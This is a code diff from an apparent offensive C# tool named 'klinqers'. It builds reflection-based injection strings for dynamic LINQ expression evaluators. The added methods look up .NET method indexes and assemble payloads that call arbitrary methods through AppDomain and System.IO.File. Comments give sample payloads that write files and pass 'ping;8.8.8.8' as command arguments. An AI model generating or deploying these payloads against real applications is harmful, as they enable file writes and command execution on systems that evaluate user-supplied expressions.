@@ -76,28 +76,83 @@ namespace klinqers
             }
 
             string strArray = String.Join(strSplitter, lstValues);
+            string strRetval = "null,\"" + strArray + "\".Split(\"" + strSplitter + "\".ToCharArray())";
 
-            if (minf.IsStatic)
+            return strRetval;
+        }
+
+        public static CallMethod getMethodPosition(Type t, string strMethodName, int parameterCount, System.Type callType, string strAssemblyPath)
+        {
+            string strType = strMethodName.Substring(0, strMethodName.LastIndexOf('.'));
+            string strMethodPart = strMethodName.Substring(strMethodName.LastIndexOf('.') + 1);
+            MethodInfo[] minf = t.GetMethods();
+
+            CallMethod callMethod = new CallMethod()
             {
+                type = t,
+                strMethodPart = strMethodPart,
+                strTypePart = strType
+            };
 
-                string strRetval = "null,\"" + strArray + "\".Split(\"" + strSplitter + "\".ToCharArray()";
-
-                return strRetval;
-            }
-            else
+            for (int x = 0; x < minf.Length; x++)
             {
-                Console.WriteLine("[-] Error: non-static-methods not yet supported");
+                MethodInfo m = minf[x];
+
+                if (m.Name == strMethodPart)
+                {
+                    ParameterInfo[] p = m.GetParameters();
+
+                    if (p.Length != parameterCount) continue;
+
+                    bool bFoundCall = true;
+
+                    for (int i = 0; i < p.Length; i++)
+                    {
+                        if (p[i].ParameterType != callType)
+                        {
+                            bFoundCall = false;
+
+                            break;
+                        }
+                    }
+
+                    if (bFoundCall)
+                    {
+                        callMethod.methodPosition = x;
+                        callMethod.minf = m;
+                        callMethod.parameterType = callType;
+                        break;
+                    }
+                }
             }
 
-            return null;
+            return callMethod;
+        }
+
+        public string buildParameterStringByCIAU(List<string> lstValues, string strMethodName)
+        {
+            string strFullname = "System, " + this.minf.Module.Assembly.FullName.Substring(this.minf.Module.Assembly.FullName.IndexOf(',')+1).Trim();
+            string strType = strMethodName.Substring(0, strMethodName.LastIndexOf('.'));
+
+
+            System.AppDomain app = System.AppDomain.CurrentDomain;
+            object obj =  app.CreateInstanceAndUnwrap(strFullname, strType);
+
+            CallMethod cm = getMethodPosition(obj.GetType(), strMethodName, lstValues.Count, typeof(System.String), null);
+
+            string strInvokeContent = getInvokeContent(lstValues);
+            string strRetval = $"\"\".GetType().Assembly.GetType(\"System.AppDomain\").GetMethods()[{this.methodPosition}].Invoke(\"\".GetType().Assembly.GetType(\"System.AppDomain\").GetProperty( \"CurrentDomain\").GetValue(null), \"{strFullname};{strType}\".Split(\";\".ToCharArray())).GetType().GetMethods()[{cm.methodPosition}].Invoke({strInvokeContent}).ToString()";
+
+
+            return strRetval;
         }
 
         public string buildParameterString(List<string> lstValues)
         {
             if (parameterType == typeof(String))
             {
-                // "".GetType().Assembly.GetType("System.IO.File").GetMethods()[37].Invoke(null,"###filename###;###content###".Split(";".ToCharArray()))).ToString()
-                //"ping;8.8.8.8".Split(";".ToCharArray()))
+                // "".GetType().Assembly.GetType("System.IO.File").GetMethods()[37].Invoke(null,"fff;#ccc###".Split(";".ToCharArray()))).ToString()
+                //"ping;8.8.8.8".Split(";".ToCharArray())
 
                 string strInvokeContent = getInvokeContent(lstValues);
                 string strCall = getCall();
